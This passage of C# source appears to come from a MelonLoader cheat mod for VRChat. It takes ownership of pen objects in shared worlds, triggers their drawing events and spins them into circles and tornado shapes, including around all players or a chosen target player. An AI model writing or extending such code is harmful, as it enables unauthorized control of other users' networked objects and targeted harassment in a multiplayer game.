                                        Transform transform = gameObject.transform;

                                        transform.position = new Vector3(0f, y, 0f);
                                        gameObject.transform.Rotate(new Vector3(0f, 360f * Time.time, 0f));
                                        Pickup.transform.position = gameObject.transform.position + gameObject.transform.forward;
                                        gameObject.transform.Rotate(new Vector3(0f, (float) (360 / AllPickups.Count), 0f));
                                        UnityEngine.Object.Destroy(gameObject);
                                        gameObject = null;
                                        transform = null;
                                    }
                                    else yield break;
                                }
                            }
                            MelonLoader.MelonCoroutines.Start(Orbit());
                        }
                    }
                }
                for (int i = 0; i < 2000; i++)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        foreach (var PenName in PenNames)
                        {
                            if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                            {
                                yield return new WaitForSeconds(0.01f);
                                float CircleSpeed = 9999;
                                float alpha = 9999f;
                                Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                                for (int x = 0; x < 4000; x++)
                                {
                                    alpha += Time.deltaTime * CircleSpeed;
                                    Pickup.transform.position = new Vector3(0 + a * (float) System.Math.Cos(alpha), 0 + 0.3f, 0 + b * (float) System.Math.Sin(alpha));
                                }
                                a += 0.003f;
                                b += 0.003f;
                                y += 0.001f;
                            }
                        }
                    }
                }
                a = 0;
                b = 0;
                yield return new WaitForSeconds(1);
                MelonCoroutines.Start(SpreadVirus2());
            }
        }

        public static IEnumerator Tornado()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                foreach (var Pickup in AllPickups)
                {
                    foreach (var PenName in PenNames)
                    {
                        if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.Drop();
                            var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                            var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            yield return new WaitForSeconds(0.2f);
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();  
                            yield return new WaitForSeconds(0.2f); //Figured out that you need a delay or else the use down rpc send before all the OnPickup events are sent and it won't work
                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown(); //But calling it only once and it won't stop drawing until it's dropped or useup so it's not sending any RPC and not causing lags
                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                            Pickup.transform.position = new Vector3(0, 0, 0);
                        }
                    }
                }
                float a = 0f;
                float b = 0f;
                float y = 0.5f;
                for (int i = 0; i < 50; i++)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        foreach (var PenName in PenNames)
                        {
                            if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                            {
                                yield return new WaitForSeconds(0.001f);
                                float CircleSpeed = 20;
                                float alpha = 0f;
                                Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                                for (int x = 0; x < 95; x++)
                                {
                                    alpha += Time.deltaTime * CircleSpeed;
                                    Pickup.transform.position = new Vector3(0 + a * (float) System.Math.Cos(alpha), y, 0 + b * (float) System.Math.Sin(alpha));
                                    yield return new WaitForSeconds(0.001f);
                                }
                                a += 0.03f;
                                b += 0.03f;
                                if (y < 5)
                                {
                                    Pickup.transform.position = new Vector3(0, 0.5f, 0);
                                    y += 0.03f;
                                }
                            }
                        }
                    }
                }
            }
        }

        public static IEnumerator DrawCircle()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                foreach (var Player in Wrappers.Utils.PlayerManager.GetAllPlayers())
                {
                    foreach (var Pickup in AllPickups)
                    {
                        foreach (var PenName in PenNames)
                        {
                            if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                            {
                                Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                                Vector3 OriginalPosition = Pickup.transform.position;
                                Quaternion OriginalRotation = Pickup.transform.rotation;
                                float CircleSpeed = 50f;
                                float alpha = 0f;
                                float a = 1f;
                                float b = 1f;
                                Pickup.Drop();
                                var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                                var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();

                                if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                                if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                                yield return new WaitForSeconds(0.2f);
                                if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                                if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                                yield return new WaitForSeconds(0.2f); 
                                if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                                if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                                Pickup.transform.position = new Vector3(Player.transform.position.x + a * (float) System.Math.Cos(alpha), Player.transform.position.y + 0.3f, Player.transform.position.z + b * (float) System.Math.Sin(alpha));
                                Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                                yield return new WaitForSeconds(0.01f);
                                for (int i = 0; i < 95; i ++)
                                {
                                    alpha += Time.deltaTime * CircleSpeed;
                                    Pickup.transform.position = new Vector3(Player.transform.position.x + a * (float) System.Math.Cos(alpha), Player.transform.position.y + 0.3f, Player.transform.position.z + b * (float) System.Math.Sin(alpha));
                                    yield return new WaitForSeconds(0.01f);
                                }
                                Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseUp();
                                yield return new WaitForSeconds(0.01f);
                                Pickup.transform.position = OriginalPosition;
                                Pickup.transform.rotation = OriginalRotation;
                                OriginalPosition = default(Vector3);
                                OriginalRotation = default(Quaternion);
                                Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            }
                        }
                    }
                }
            }
        }

        public static IEnumerator DrawCircleTarget(VRCPlayer player)
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            if (AllPickups != null)
            {
                foreach (var Pickup in AllPickups)
                {
                    foreach (var PenName in PenNames)
                    {
                        if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Vector3 OriginalPosition = Pickup.transform.position;
                            Quaternion OriginalRotation = Pickup.transform.rotation;
                            float CircleSpeed = 50f;
                            float alpha = 0f;
                            float a = 1f;
                            float b = 1f;
                            Pickup.Drop();
                            Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                            Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                            yield return new WaitForSeconds(0.2f); //Figured out that you need a delay or else the use down rpc send before all the OnPickup events are sent and it won't work
                            Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown(); //But calling it only once and it won't stop drawing until it's dropped or useup so it's not sending any RPC after this one and not causing lags
                            Pickup.transform.position = new Vector3(player.transform.position.x + a * (float) System.Math.Cos(alpha), player.transform.position.y + 0.3f, player.transform.position.z + b * (float) System.Math.Sin(alpha));
                            Pickup.transform.rotation = new Quaternion(-0.7f, 0f, 0f, 0.7f);
                            yield return new WaitForSeconds(0.01f);
                            for (int i = 0; i < 95; i++)
                            {
                                alpha += Time.deltaTime * CircleSpeed;
                                Pickup.transform.position = new Vector3(player.transform.position.x + a * (float) System.Math.Cos(alpha), player.transform.position.y + 0.3f, player.transform.position.z + b * (float) System.Math.Sin(alpha));
                                yield return new WaitForSeconds(0.01f);
                            }
                            Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseUp();
                            yield return new WaitForSeconds(0.01f);
                            Pickup.transform.position = OriginalPosition;
                            Pickup.transform.rotation = OriginalRotation;
                            OriginalPosition = default(Vector3);
                            OriginalRotation = default(Quaternion);
                            Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                        }
                    }
                }
            }
        }
    }
}